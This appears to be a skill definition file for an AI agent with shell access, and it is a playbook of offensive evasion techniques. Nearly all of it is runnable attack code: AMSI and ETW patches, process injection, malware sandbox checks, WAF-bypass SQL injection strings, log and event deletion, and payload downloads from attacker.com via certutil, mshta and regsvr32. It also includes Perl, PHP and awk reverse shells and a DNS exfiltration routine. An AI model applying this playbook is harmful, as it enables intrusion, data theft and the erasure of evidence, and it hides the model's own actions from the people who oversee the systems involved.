---
name: evasion-techniques
description: Advanced evasion techniques for bypassing security controls including AV/EDR bypass, network IDS/IPS evasion, sandbox detection, and anti-forensics methods
allowed-tools: Bash, Read, Write, Grep, MultiEdit
---

# Evasion Techniques Skill

## Purpose
Provides comprehensive evasion techniques for bypassing modern security controls including antivirus, EDR solutions, network monitoring, sandboxes, and forensic analysis during penetration testing engagements.

## Antivirus and EDR Evasion

### Signature Evasion
```bash
# Payload obfuscation with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e x64/shikata_ga_nai -i 10 -o payload.exe

# Multiple encoding iterations
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | \
  msfvenom -e x86/shikata_ga_nai -i 5 -f raw -a x64 --platform windows | \
  msfvenom -e x64/xor_dynamic -i 3 -f exe -o encoded.exe

# Custom XOR encoding
python3 -c "
import sys
key = b'secretkey'
with open('payload.exe', 'rb') as f:
    data = f.read()
encoded = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
with open('encoded.bin', 'wb') as f:
    f.write(encoded)
"

# String obfuscation
sed 's/mimikatz/m1m1k@tz/g' mimikatz.exe > modified.exe
```

### Process Injection Techniques
```powershell
# Classic process injection
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

# Process hollowing
# Suspend -> Unmap -> Write -> Resume
./processhollowing.exe svchost.exe payload.exe

# Early Bird APC injection
# Create suspended process -> Queue APC -> Resume
./earlybird.exe notepad.exe shellcode.bin

# Module stomping
# Overwrite legitimate DLL in memory
./modulestomping.exe target.exe kernel32.dll shellcode.bin
```

### AMSI Bypass
```powershell
# Patching AmsiScanBuffer
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative AMSI bypass
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Obfuscated AMSI bypass
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ = [ZQCUW]::LoadLibrary("amsi.dll")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "AmsiScanBuffer")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($TLML, 0, $XPYMWR, 6)
```

### ETW Evasion
```powershell
# Patch ETW
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

# Alternative ETW bypass
$id = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -ExpandProperty Id
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Where-Object {$_.ProcessId -eq $id} | Remove-WinEvent

# Disable ETW providers
logman stop "EventLog-Microsoft-Windows-Windows-Defender-Operational" -ets
```

### DLL Sideloading
```bash
# Find vulnerable executables
# Look for signed executables loading DLLs from writable paths
for exe in /path/to/executables/*.exe; do
    strings "$exe" | grep -E "\.dll$" | while read dll; do
        echo "Checking $exe for $dll"
        strace "$exe" 2>&1 | grep -E "open.*$dll.*ENOENT"
    done
done

# Create proxy DLL
# Export forwarding to original DLL
echo "
#pragma comment(linker,\"/export:Function1=original.dll.Function1\")
#pragma comment(linker,\"/export:Function2=original.dll.Function2\")
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system(\"cmd.exe /c calc.exe\");
    }
    return TRUE;
}
" > proxy.c

# Compile proxy DLL
x86_64-w64-mingw32-gcc -shared -o proxy.dll proxy.c
```

## Network IDS/IPS Evasion

### Packet Fragmentation
```bash
# Nmap fragmentation
nmap -f -sS target.com  # 8-byte fragments
nmap -mtu 16 -sS target.com  # 16-byte MTU

# Scapy custom fragmentation
python3 -c "
from scapy.all import *
target = '192.168.1.100'
packet = IP(dst=target)/TCP(dport=80, flags='S')
fragments = fragment(packet, fragsize=8)
for frag in fragments:
    send(frag)
"

# hping3 fragmentation
hping3 -S -f -p 80 target.com
hping3 -S --mtu 16 -p 80 target.com
```

### Timing and Rate Limiting
```bash
# Slow scanning
nmap -T0 target.com  # Paranoid timing
nmap -T1 target.com  # Sneaky timing
nmap --scan-delay 5s target.com
nmap --max-rate 10 target.com

# Custom timing with scapy
python3 -c "
import time
from scapy.all import *
import random

for port in range(1, 1000):
    packet = IP(dst='target.com')/TCP(dport=port, flags='S')
    send(packet, verbose=0)
    time.sleep(random.uniform(1, 5))
"
```

### Protocol Manipulation
```bash
# Decoy scanning
nmap -D RND:10 target.com  # 10 random decoys
nmap -D decoy1,decoy2,ME,decoy3 target.com

# Source port manipulation
nmap --source-port 53 target.com  # DNS source port
nmap --source-port 80 target.com  # HTTP source port

# Bad checksum
nmap --badsum target.com

# Protocol hopping
# TCP SYN scan followed by UDP
nmap -sS -sU target.com
```

### Encryption and Tunneling
```bash
# SSH tunneling
ssh -D 9050 user@proxy-server
proxychains nmap -sT target.com

# SSL/TLS tunneling with stunnel
# stunnel.conf
[service]
accept = 127.0.0.1:8080
connect = target.com:443
client = yes

# DNS tunneling
dnscat2 --secret=password domain.com
iodine -f -P password tunnel.domain.com

# ICMP tunneling
ptunnel -p proxy-server -lp 8000 -da target.com -dp 22
```

### Payload Encoding for Network
```bash
# Base64 encoding in HTTP
curl -H "Cookie: $(echo -n 'malicious_payload' | base64)" http://target.com

# Unicode encoding
echo "payload" | iconv -t UTF-16LE | base64

# Double URL encoding
python3 -c "
import urllib.parse
payload = 'SELECT * FROM users'
single_encoded = urllib.parse.quote(payload)
double_encoded = urllib.parse.quote(single_encoded)
print(double_encoded)
"

# Case variation bypass
# MiXeD CaSe for SQL injection
sqlmap -u "http://target.com?id=1" --tamper=randomcase
```

## Sandbox Detection and Evasion

### Environment Detection
```c
// Check for sandbox artifacts
bool is_sandbox() {
    // Check username
    char username[256];
    DWORD username_len = sizeof(username);
    GetUserName(username, &username_len);
    if (strstr(username, "sandbox") || strstr(username, "virus") ||
        strstr(username, "malware") || strstr(username, "test")) {
        return true;
    }

    // Check computer name
    char computer[256];
    DWORD computer_len = sizeof(computer);
    GetComputerName(computer, &computer_len);
    if (strstr(computer, "SANDBOX") || strstr(computer, "VMWARE") ||
        strstr(computer, "VBOX")) {
        return true;
    }

    // Check for VM files
    if (GetFileAttributes("C:\\windows\\system32\\drivers\\vmmouse.sys") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributes("C:\\windows\\system32\\drivers\\vmhgfs.sys") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributes("C:\\windows\\system32\\drivers\\vboxmouse.sys") != INVALID_FILE_ATTRIBUTES) {
        return true;
    }

    // Check processes
    if (GetModuleHandle("SbieDll.dll") || // Sandboxie
        GetModuleHandle("dbghelp.dll") ||  // Debugging
        GetModuleHandle("api_log.dll")) {  // API monitoring
        return true;
    }

    return false;
}

// Sleep acceleration detection
bool sleep_acceleration_check() {
    DWORD start = GetTickCount();
    Sleep(10000); // Sleep 10 seconds
    DWORD elapsed = GetTickCount() - start;
    if (elapsed < 9000) { // If less than 9 seconds passed
        return true; // Sandbox detected
    }
    return false;
}
```

### Resource Checks
```powershell
# Check CPU cores
if ((Get-WmiObject Win32_Processor).NumberOfCores -lt 2) {
    Exit  # Likely sandbox
}

# Check RAM
if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) {
    Exit  # Likely sandbox
}

# Check disk size
if ((Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size -lt 60GB) {
    Exit  # Likely sandbox
}

# Check running processes count
if ((Get-Process).Count -lt 50) {
    Exit  # Likely sandbox
}
```

### User Interaction Requirements
```python
# Require mouse movement
import pyautogui
import time

initial_pos = pyautogui.position()
time.sleep(30)  # Wait 30 seconds
current_pos = pyautogui.position()

if initial_pos == current_pos:
    exit()  # No mouse movement, likely automated analysis

# Check for recent documents
import os
import datetime

docs_path = os.path.expanduser("~/Documents")
files = os.listdir(docs_path)
recent_files = 0

for file in files:
    file_path = os.path.join(docs_path, file)
    mod_time = os.path.getmtime(file_path)
    if (datetime.datetime.now() - datetime.datetime.fromtimestamp(mod_time)).days < 7:
        recent_files += 1

if recent_files < 5:
    exit()  # No recent activity, likely sandbox
```

### Time-Based Evasion
```c
// Delayed execution
void delayed_payload() {
    SYSTEMTIME st;
    GetLocalTime(&st);

    // Only execute after 5 PM
    if (st.wHour < 17) {
        Sleep(3600000);  // Sleep 1 hour
        delayed_payload();  // Recursive check
        return;
    }

    // Only execute on weekdays
    if (st.wDayOfWeek == 0 || st.wDayOfWeek == 6) {
        return;  // Weekend, don't execute
    }

    // Execute payload
    execute_malicious_code();
}

// Fast forward detection
ULONGLONG GetRealTime() {
    ULONGLONG result = 0;
    __asm {
        rdtsc
        mov dword ptr[result], eax
        mov dword ptr[result + 4], edx
    }
    return result;
}

bool CheckTiming() {
    ULONGLONG start = GetRealTime();
    Sleep(1000);
    ULONGLONG elapsed = GetRealTime() - start;
    // Check if time passed normally
    return elapsed > 2000000000;  // Approximate CPU cycles for 1 second
}
```

## Application Layer Evasion

### Web Application Firewall Bypass
```bash
# SQL injection WAF bypass
# Using comments
id=1/**/union/**/select/**/1,2,3--

# Case variation
id=1 UnIoN SeLeCt 1,2,3--

# Encoding
id=1%20union%20select%201,2,3--  # URL encoding
id=1%2520union%2520select%25201,2,3--  # Double URL encoding

# Using alternative syntax
id=1/*!50000union*//*!50000select*/1,2,3--  # MySQL specific

# Time-based blind with randomization
id=1' AND (SELECT * FROM (SELECT(SLEEP(5-(RAND()*4))))a)--

# Buffer overflow attempts
id=AAAAAAAAAA[...]AAAAA' union select 1,2,3--

# HTTP Parameter Pollution
?id=1&id=' union select 1,2,3--

# Using JSON/XML
{"id":"1' union select 1,2,3--"}
<id>1' union select 1,2,3--</id>
```

### Header Manipulation
```bash
# User-Agent rotation
user_agents=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)
ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
curl -H "User-Agent: $ua" http://target.com

# X-Forwarded-For spoofing
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
curl -H "X-Originating-IP: 10.0.0.1" http://target.com
curl -H "X-Remote-IP: 192.168.1.1" http://target.com

# Content-Type manipulation
curl -H "Content-Type: text/plain" -d "{'sql':'injection'}" http://target.com/api
```

## Anti-Forensics Techniques

### Timestamp Manipulation
```bash
# Linux timestamp modification
touch -t 202301011200.00 file.txt  # Specific time
touch -r /etc/passwd file.txt  # Copy timestamp

# Modify all timestamps
touch -a -m -t 202301011200.00 file.txt

# Using debugfs for ext filesystems
debugfs -w /dev/sda1
debugfs: set_inode_field file.txt atime 202301011200
debugfs: set_inode_field file.txt mtime 202301011200
debugfs: set_inode_field file.txt ctime 202301011200

# Windows timestamp modification
$(Get-Item file.txt).CreationTime = "01/01/2023 12:00:00"
$(Get-Item file.txt).LastWriteTime = "01/01/2023 12:00:00"
$(Get-Item file.txt).LastAccessTime = "01/01/2023 12:00:00"
```

### Log Manipulation
```bash
# Clear specific log entries
sed -i '/attacker_ip/d' /var/log/auth.log
sed -i '/specific_command/d' ~/.bash_history

# Selective log clearing
# Clear last hour of logs
journalctl --vacuum-time=1h

# Stop logging temporarily
service rsyslog stop
# Do malicious activities
service rsyslog start

# Windows event log manipulation
wevtutil el | ForEach-Object {wevtutil cl "$_"}
Clear-EventLog -LogName Application, System, Security

# Selective Windows log deletion
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} |
    Where-Object {$_.Message -match "attacker"} |
    ForEach-Object {Remove-WinEvent -LogName Security -InstanceId $_.InstanceId}
```

### Memory Forensics Evasion
```c
// Direct syscalls to avoid hooks
__attribute__((naked)) NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect) {
    __asm {
        mov r10, rcx
        mov eax, 0x18  // NtAllocateVirtualMemory syscall number
        syscall
        ret
    }
}

// Memory encryption
void encrypt_memory(void* addr, size_t size) {
    unsigned char key[] = "secretkey123456";
    unsigned char* mem = (unsigned char*)addr;
    for (size_t i = 0; i < size; i++) {
        mem[i] ^= key[i % sizeof(key)];
    }
}

// Heap spray obfuscation
void heap_spray_cover() {
    for (int i = 0; i < 1000; i++) {
        void* decoy = malloc(1024);
        memset(decoy, 0x90, 1024);  // NOP sled
    }
}
```

### File System Tricks
```bash
# Alternate Data Streams (Windows)
echo "hidden data" > file.txt:hidden
type payload.exe > legitimate.txt:payload.exe
wmic process call create "C:\\path\\legitimate.txt:payload.exe"

# Linux hidden files
# Unicode tricks
touch $'test\u202e\u0074\u0078\u0074.exe'  # Appears as test.txt

# Using reserved names
mkdir ".. "  # Directory with space
mkdir $'...\r'  # With carriage return

# Hiding in /dev/shm (RAM disk)
cp payload /dev/shm/.hidden
chmod +x /dev/shm/.hidden
/dev/shm/.hidden &

# Slack space hiding
# Write to slack space between file end and cluster boundary
bmap --mode putslack file.txt < hidden_data.txt
bmap --mode slack file.txt  # Read back
```

## Living Off the Land Binaries (LOLBins)

### Windows LOLBins
```powershell
# Certutil download and decode
certutil -urlcache -f http://attacker.com/payload.b64 payload.b64
certutil -decode payload.b64 payload.exe

# Bitsadmin
bitsadmin /transfer job /download /priority normal http://attacker.com/payload.exe C:\payload.exe

# Regsvr32
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# Mshta
mshta http://attacker.com/payload.hta

# Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.js")

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### Linux LOLBins
```bash
# Python
python -c "import os;os.system('wget http://attacker.com/p -O /tmp/p;chmod +x /tmp/p;/tmp/p')"

# Perl
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(4444,inet_aton("10.10.10.10")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -e 'exec "/bin/sh"'

# PHP
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Awk
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Compiler and Packer Evasion

### Custom Packers
```python
# Simple XOR packer
def pack_exe(input_file, output_file, key):
    with open(input_file, 'rb') as f:
        data = f.read()

    # XOR encrypt
    encrypted = bytearray()
    for i, byte in enumerate(data):
        encrypted.append(byte ^ ord(key[i % len(key)]))

    # Stub that decrypts and executes
    stub = f"""
import sys
import ctypes
key = '{key}'
encrypted = {bytes(encrypted)}
decrypted = bytearray()
for i, byte in enumerate(encrypted):
    decrypted.append(byte ^ ord(key[i % len(key)]))
# Execute in memory
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(decrypted), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, bytes(decrypted), len(decrypted))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
"""

    with open(output_file, 'w') as f:
        f.write(stub)
```

### Compiler Optimizations
```bash
# Strip symbols
strip --strip-all payload
strip -s payload

# Optimize for size
gcc -Os -s -ffunction-sections -fdata-sections -Wl,--gc-sections payload.c -o payload

# UPX packing with custom settings
upx --best --ultra-brute payload
upx -9 --compress-icons=0 --compress-exports=0 payload

# Custom section names
objcopy --rename-section .text=.data payload payload_modified
```

## Network Covert Channels

### DNS Covert Channel
```python
# DNS exfiltration with encoding
import dns.resolver
import base64

def dns_exfil(data, domain):
    # Split data into chunks
    chunks = [data[i:i+30] for i in range(0, len(data), 30)]

    for i, chunk in enumerate(chunks):
        # Encode and format as subdomain
        encoded = base64.b32encode(chunk.encode()).decode().lower().strip('=')
        query = f"{i}.{encoded}.{domain}"

        try:
            # Trigger DNS query
            dns.resolver.resolve(query, 'A')
        except:
            pass  # Expected to fail, we just want the query

# Usage
dns_exfil("sensitive_data", "attacker.com")
```

### HTTP Covert Channel
```python
# Hide data in HTTP headers
import requests

def http_covert_channel(data, url):
    # Split into chunks that fit in headers
    chunks = [data[i:i+100] for i in range(0, len(data), 100)]

    for chunk in chunks:
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'X-Custom-Header': base64.b64encode(chunk.encode()).decode(),
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache'
        }

        # Send request with hidden data
        requests.get(url, headers=headers)
```

## Best Practices

1. **Layer multiple evasion techniques** for defense in depth
2. **Test against target environment** before deployment
3. **Keep payloads modular** for easy modification
4. **Monitor for detection** during operations
5. **Use legitimate tools** when possible (LOLBins)
6. **Implement fail-safes** to prevent exposure
7. **Document evasion methods** for repeatability
8. **Stay updated** on latest detection techniques

## Integration Notes

- Essential for all exploitation agents to avoid detection
- Works with persistence-techniques for maintaining access
- Supports data-exfiltration with covert channels
- Enhances privesc-agent operations with AV/EDR bypass
- Critical for cloud-infrastructure testing in monitored environments